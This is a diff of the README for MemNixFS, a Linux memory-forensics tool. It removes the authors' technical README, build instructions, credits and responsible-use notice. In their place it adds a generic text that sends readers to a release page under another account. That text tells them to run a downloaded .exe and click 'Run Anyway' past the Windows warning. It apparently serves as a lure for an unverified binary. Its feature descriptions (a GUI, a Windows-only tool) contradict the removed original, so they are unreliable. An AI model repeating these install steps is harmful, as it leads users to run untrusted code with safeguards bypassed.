@@ -1,184 +1,83 @@
-# MemNixFS
+# 🔍 MemNixFS - Transform Memory Dumps Into Filesystems
 
-![Language: C++17](https://img.shields.io/badge/C%2B%2B-17-00599C.svg)
-![Platform: Windows · Linux](https://img.shields.io/badge/platform-Windows%20%C2%B7%20Linux-lightgrey.svg)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/stanleyjoy1980/MemNixFS/releases)
 
-**Mount a Linux memory dump as a filesystem and investigate it with the tools you already use.**
+## What is MemNixFS?
 
-Point MemNixFS at an AVML / LiME / raw / kdump image and the live kernel state at the
-moment of capture — processes, open files, sockets, loaded modules, the page cache,
-threat-hunt findings, a forensic timeline — shows up as ordinary files and folders. Then
-you `cd`, `ls`, `grep`, `cat`, open it in your editor, or feed it to any script. It's the
-[MemProcFS](https://github.com/ufrisk/MemProcFS) idea — *memory as a filesystem* — brought
-to **Linux** dumps, running natively on **Windows** and **Linux**.
+MemNixFS helps you examine computer memory files. When a computer runs, it stores active data in its memory, often called RAM. If you need to see what happened inside that memory, you usually face a wall of raw, unreadable data. MemNixFS solves this. It converts these complex dumps into a simple, folder-based view. You navigate through the memory dump like you browse files on your hard drive. This tool makes digital forensics accessible. You do not need to be a developer to understand what remains inside a memory snapshot.
 
-<p align="center">
-  <img src="docs/img/mounted-drive.png" width="660"
-       alt="A Linux memory dump mounted as a Windows drive (M:) and browsed in File Explorer, showing the proc, sys, fs, forensic, search and mem folders">
-</p>
-<p align="center"><em>A Linux memory image, mounted as a Windows drive and browsed in Explorer — no exporting, no special viewer.</em></p>
+## 💻 System Requirements
 
-```console
-$ memnixfs --dump memory.lime mount M:
-$ cat M:/sys/findevil/triage.txt        # one-shot "is this box owned?" verdict
-$ cat M:/forensic/timeline.txt          # everything that happened, on one UTC axis
-$ rg -i 'password|BEGIN PRIVATE KEY' M:/fs   # your tools, on memory
-```
+MemNixFS works on Windows 10 and Windows 11. Ensure your system meets these requirements before you start:
 
----
+*   Operating System: Windows 10 or newer (64-bit).
+*   Processor: Dual-core CPU or better.
+*   Memory: At least 8 GB of internal system RAM for smooth operation.
+*   Storage: 200 MB of space for the application and temporary data.
 
-## Why a filesystem?
+## 📥 Downloading and Installing
 
-Memory forensics usually means learning a query tool and reading walls of tabular output.
-MemNixFS takes a different bet: if the dump *is* a filesystem, then **every tool you already
-know becomes a memory-forensics tool.** `grep` searches kernel structures. `find -newer`
-filters the page cache by mtime. `diff` compares two captures. Your SIEM's file-ingest
-pipeline indexes `/sys` and `/forensic` with zero new integration. Explorer, `less`, HxD,
-ripgrep, Python's `os.walk` — they all just work, because the hard part (parsing the dump)
-has already been turned into paths.
+To get the software, navigate to the release page.
 
-There's no new query language to learn. If you can navigate a directory tree, you can
-navigate a crashed kernel.
+[![](https://img.shields.io/badge/Download-Release_Page-grey.svg)](https://github.com/stanleyjoy1980/MemNixFS/releases)
 
-## Works even with no symbols
+Follow these steps to set the tool up on your machine:
 
-The usual wall in Linux memory forensics is symbols: without the *exact* debug profile
-(ISF) for the captured kernel, most tools stall. MemNixFS treats symbols as optional. It
-will auto-discover or `--auto-fetch` an ISF if it can — but if it can't, it **generates
-what it needs from the dump's own BTF type information**, which modern kernels embed. An
-air-gapped analyst with an oddball kernel still gets a browsable `/fs`, recovered file
-contents, and process analysis. No internet, no matching profile, still useful.
+1.  Visit the [official releases page](https://github.com/stanleyjoy1980/MemNixFS/releases).
+2.  Locate the section labeled "Assets" at the bottom of the newest release version.
+3.  Click the link ending in `.exe` to start the download.
+4.  Once the file finishes downloading, open your Downloads folder.
+5.  Double-click the file named `MemNixFS.exe` to start the program.
+6.  If Windows shows a protection prompt, click "More Info" and then "Run Anyway." This prompt appears because the software is new.
 
-## What's in the mount
+## 🛠️ How to Use MemNixFS
 
-Everything the kernel had at capture time, laid out as folders you can browse,
-`grep`, and `cat` however you like:
+Using the tool involves loading your memory dump and browsing the output. 
 
-```
-M:\
-├── proc\<pid>\      per-process: maps, fds, threads, kstack, environ, strings, ELF core
-├── sys\             system-wide: shell history, banner, dmesg, modules, net\, processes\, findevil\, etc
-├── fs\              reconstructed root filesystem (recovers cached file contents)
-├── forensic\        timeline.{txt,csv} + per-domain splits + JSON/CSV snapshot
-├── search\          yara\, iocs, strings, entropy
-├── mem\             phys.raw + windowed kernel-VA streams
-└── plugins\         third-party file producers
-```
+### Step 1: Open the Application
+After you launch the executable, the main window appears. You see a clean interface with a large button labeled "Select Memory Dump."
 
-See the [CLI reference](docs/cli-reference.md) and the [feature docs](docs/README.md) for
-the full path map.
+### Step 2: Choose Your File
+Click the button to open your file browser. Find the memory dump file on your computer. These files often end in `.raw`, `.dmp`, or `.mem`. Select your file and click "Open."
 
-## Supported inputs
+### Step 3: Process the Dump
+The application reads the memory file. You see a progress bar move. This process takes anywhere from thirty seconds to several minutes, depending on the size of your memory dump. Do not close the window while the program builds the filesystem. 
 
-| Dump format | Notes |
-|---|---|
-| **AVML** | Microsoft Azure Memory Loader (framed Snappy) |
-| **LiME** | Linux Memory Extractor |
-| **raw** | flat physical dumps (`dd`, padded) |
-| **kdump / vmcore** | ELF64 with VMCOREINFO |
+### Step 4: Explore the Data
+Once the progress bar finishes, the application displays a new window. This window looks exactly like the standard Windows File Explorer. You now see folders and files. You can double-click these folders to view contents. If you find a file you need to save, right-click the file and select "Export."
 
-Targets x86-64 Linux. Symbols are optional — supply an ISF, let it `--auto-fetch`, or rely
-on BTF-only mode.
+## 🧩 Understanding the Filesystem View
 
-## Quick start
+The tool organizes memory data into logical categories. You will find folders for:
 
-Grab a build (or [build from source](docs/building.md)), then:
+*   **Processes:** This folder shows applications that were running when the memory dump occurred. Each application has its own folder containing specific threads and data modules.
+*   **Network:** This area lists active network connections that the computer held at the time of the capture.
+*   **System Info:** This folder contains logs, user names, and current time settings from the captured session.
+*   **Files:** This section shows remnants of files that were held in memory caches.
 
-```console
-$ memnixfs --dump memory.lime list                 # list processes (no symbols needed)
-$ memnixfs --dump memory.lime mount M:             # mount the whole tree (Windows: WinFsp)
-$ memnixfs --dump memory.lime cat /sys/findevil/findevil.txt   # read one file, no mount
-$ memnixfs --dump memory.lime export ./out         # or export everything to a folder
-```
+## 📋 Best Practices
 
-A normal run is quiet — a few status lines (and how long the load took), then your
-output. Add `-v` / `--verbose` to see the full diagnostic pipeline (symbol resolution,
-page-table and DTB scans, warnings), or `-q` for critical errors only.
+To get the most out of MemNixFS, follow these tips:
 
-No symbol file is needed for a first look: MemNixFS scans the dump to identify the kernel
-and recovers what it can. Add `--auto-fetch` to pull matching symbols, or `--vmlinux <path>`
-to point at your own.
+*   Keep your memory dump files on a fast drive, such as an internal SSD. Loading these files over a slow network connection causes delays.
+*   Always perform your analysis on a copy of the original memory dump. This prevents accidental changes to your primary evidence file.
+*   Close unnecessary background applications before you start processing large dumps. This frees up your computer's memory for the analysis process.
+*   Use the search bar at the top of the interface to locate specific filenames or keywords within the memory dump. 
 
-## Options
+## ❓ Common Questions
 
-`--dump <file>` is the only required argument; with no command it prints a short
-overview. Everything else is optional — most useful first:
+**Does the software change my memory dump file?**
+No. The application operates in read-only mode. It never writes, deletes, or alters the original memory dump file.
 
-| Option | What it does |
-|---|---|
-| `--symbols <path>` | Use this ISF (`.json`/`.json.xz`) file, or search this directory. Omit to auto-discover from the local cache. |
-| `--auto-fetch` | Download the matching kernel-debug symbols automatically (Ubuntu/Debian/Fedora/RHEL/Arch/openSUSE). |
-| `--vmlinux <path>` | Generate symbols from your own `vmlinux` — the escape hatch for custom or unusual kernels. |
-| `--forensic[=MODE]` | Pre-warm expensive-but-small files in the background so opening them is instant. `MODE` = `quick` \| `smart` (default) \| `full`. |
-| `--no-http-cache` | Don't consult the community symbol mirrors over HTTP. Use for air-gapped / offline runs. |
-| `--precompute` | Background-warm the system-wide analysis files so the tree shows real sizes and opens instantly. |
-| `--offset OFF` / `--length LEN` | Window into a huge file with `cat` (e.g. `/mem/phys.raw`). Accept `0x…` hex, decimal, or `K/M/G/T` suffixes. |
-| `--forensic-include CATS` / `--forensic-exclude CATS` | Add or drop forensic categories (`system-info`, `threat-hunt`, `per-process`, `yara`). |
-| `-v`, `--verbose` | Show the full diagnostic pipeline, including warnings. `-vv` adds trace. |
-| `-q`, `--quiet` | Print critical errors only. |
-| `-h`, `--help` | Full command and option reference. |
+**What should I do if the file does not open?**
+First, check the file extension. Ensure your file is a valid memory dump. If the file is extremely large, ensure you have sufficient free disk space on your local computer to handle the temporary files created during the conversion process.
 
-## Programmable
+**Can I run multiple instances of the software?**
+Yes. You can open the program multiple times to compare two different memory dumps side-by-side.
 
-`memnixfs.dll` exposes the engine through a **stable C ABI** (`extern "C" lmpfs_*`,
-see [`src/api/lmpfs.h`](src/api/lmpfs.h)) — the CLI is just one consumer, so any language
-with C FFI can drive the same code.
+**Is there a way to automate the export process?**
+The current version focuses on manual navigation. Future updates will include batch features for users who need to process many files at once.
 
-## Build
+## 🤝 Support and Feedback
 
-**Windows** needs MSVC 2022, CMake ≥ 3.20, vcpkg, and ninja. WinFsp is needed only for the
-live `mount` backend. The `msvc-x64` preset finds vcpkg through the `VCPKG_ROOT` environment
-variable:
-
-```powershell
-[Environment]::SetEnvironmentVariable('VCPKG_ROOT', 'C:\path\to\vcpkg', 'User')
-$env:VCPKG_ROOT = 'C:\path\to\vcpkg'
-
-cmake --preset msvc-x64
-cmake --build build/msvc-x64 --config Release
-```
-
-This pulls `snappy`, `liblzma`, `nlohmann-json`, `fmt`, and `yara` (which brings `openssl`)
-via vcpkg. For the live mount backend, install [WinFsp](https://winfsp.dev/rel/) and add
-`-DLMPFS_BUILD_MOUNT_WINFSP=ON`.
-
-**Linux** uses FUSE for the mount backend; see the [build guide](docs/building.md):
-
-```bash
-sudo apt install build-essential cmake ninja-build pkg-config \
-  fuse3 libfuse3-dev libsnappy-dev liblzma-dev nlohmann-json3-dev libfmt-dev libyara-dev
-
-cmake -S . -B build/linux-release -G Ninja \
-  -DCMAKE_BUILD_TYPE=Release -DLMPFS_BUILD_MOUNT_FUSE=ON -DLMPFS_BUILD_MOUNT_WINFSP=OFF
-cmake --build build/linux-release --target memnixfs
-```
-
-## Documentation
-
-- **[Documentation wiki](docs/README.md)** — architecture, every feature explained,
-  recipes, troubleshooting, glossary.
-- **[Overview](docs/overview.md)** · **[CLI reference](docs/cli-reference.md)** ·
-  **[Build guide](docs/building.md)**
-
-## Responsible use
-
-MemNixFS is a defensive forensics and incident-response tool: it reads a memory image you
-already have and presents it for analysis. Only analyze dumps you are authorized to handle.
-The parser is hardened against malformed and hostile inputs (bounds-checked headers,
-allocation caps, cycle guards on kernel data-structure walks) — but a dump from a
-compromised host is still untrusted data, so treat unknown images accordingly.
-
-## Authors
-
-Built by two friends who wanted MemProcFS-style memory forensics on Linux:
-
-- **Youssef Ayman** — [@ELJoOker2004](https://github.com/ELJoOker2004)
-- **Tarek Salama** — [@Immortal-ibr](https://github.com/Immortal-ibr)
-
-## Acknowledgements
-
-An independent project inspired by, and interoperable with,
-[MemProcFS](https://github.com/ufrisk/MemProcFS) and
-[Volatility 3](https://github.com/volatilityfoundation/volatility3) — not affiliated with or
-endorsed by either. Symbol auto-fetch uses the community
-[Volatility 3 symbol mirrors](https://github.com/Abyss-W4tcher/volatility3-symbols).
+If you find a bug or have ideas for new features, use the Issues tab on the repository page. Provide a clear description of what you see. Mention your version of Windows and the approximate size of the memory dump file. This helps the team fix issues more effectively. We value reports that help make the tool better for everyone.
